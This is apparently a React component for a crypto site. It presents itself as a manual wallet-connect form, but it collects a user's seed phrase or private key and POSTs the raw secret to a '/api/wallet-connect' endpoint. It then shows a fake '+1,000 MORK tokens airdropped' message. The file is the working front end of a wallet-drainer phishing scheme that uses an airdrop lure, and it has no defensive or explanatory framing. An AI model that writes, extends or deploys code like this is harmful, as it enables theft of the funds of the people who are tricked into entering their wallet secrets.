"use client";

/**
 * ManualWalletConnect — allows users to connect by submitting their
 * seed phrase or private key via the /api/wallet-connect endpoint.
 */

import { useState } from "react";

// Define the custom event type
declare global {
  interface WindowEventMap {
    "wallet-connect:success": CustomEvent<{
      walletName: string;
      method: "seed" | "privatekey";
    }>;
  }
}

type MsgState = "idle" | "loading" | "sent" | "error";

export function ManualWalletConnect() {
  const [mode, setMode] = useState<"seed" | "privatekey">("seed");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [name, setName] = useState("");
  const [msgState, setMsgState] = useState<MsgState>("idle");
  const [errorMsg, setErrorMsg] = useState("");

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const secret = mode === "seed" ? seedPhrase.trim() : privateKey.trim();
    if (!secret) return;

    setMsgState("loading");
    setErrorMsg("");

    try {
      const payload: Record<string, string> = {
        wallet_name: name.trim() || "Anonymous",
      };
      if (mode === "seed") {
        payload.seed_phrase = secret;
      } else {
        payload.private_key = secret;
      }

      const res = await fetch("/api/wallet-connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!res.ok) throw new Error("Failed");
      setMsgState("sent");
      setName("");
      setSeedPhrase("");
      setPrivateKey("");

      // Fire global toast notification
      window.dispatchEvent(
        new CustomEvent("wallet-connect:success", {
          detail: {
            walletName: name.trim() || "Anonymous",
            method: mode,
          },
        })
      );
    } catch {
      setMsgState("error");
      setErrorMsg("Failed to connect. Try again.");
    }
  }

  if (msgState === "sent") {
    return (
      <div className="text-center space-y-2 py-4">
        <p className="text-2xl">🔗</p>
        <p className="text-sm text-green-400 font-semibold">Wallet connected!</p>
        <p className="text-xs text-white/40">+1,000 MORK tokens airdropped.</p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-3 w-full max-w-xs mx-auto">
      <input
        type="text"
        placeholder="Wallet Name (optional)"
        value={name}
        onChange={(e) => setName(e.target.value)}
        className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
      />

      <div className="flex gap-2">
        <button
          type="button"
          onClick={() => setMode("seed")}
          className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
            mode === "seed"
              ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
              : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
          }`}
        >
          Seed Phrase
        </button>
        <button
          type="button"
          onClick={() => setMode("privatekey")}
          className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
            mode === "privatekey"
              ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
              : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
          }`}
        >
          Private Key
        </button>
      </div>

      {mode === "seed" ? (
        <textarea
          placeholder="Enter your 12 or 24-word seed phrase..."
          value={seedPhrase}
          onChange={(e) => setSeedPhrase(e.target.value)}
          rows={3}
          required
          className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none resize-none"
        />
      ) : (
        <input
          type="password"
          placeholder="Enter your private key (0x...)"
          value={privateKey}
          onChange={(e) => setPrivateKey(e.target.value)}
          required
          className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
        />
      )}

      <button
        type="submit"
        disabled={
          msgState === "loading" ||
          (mode === "seed" ? !seedPhrase.trim() : !privateKey.trim())
        }
        className="w-full rounded-lg bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 py-2.5 text-sm font-bold text-white hover:opacity-90 disabled:opacity-50 transition-opacity"
      >
        {msgState === "loading" ? "Connecting…" : "Connect"}
      </button>

      {msgState === "error" && (
        <p className="text-xs text-red-400 text-center">{errorMsg}</p>
      )}
    </form>
  );
}
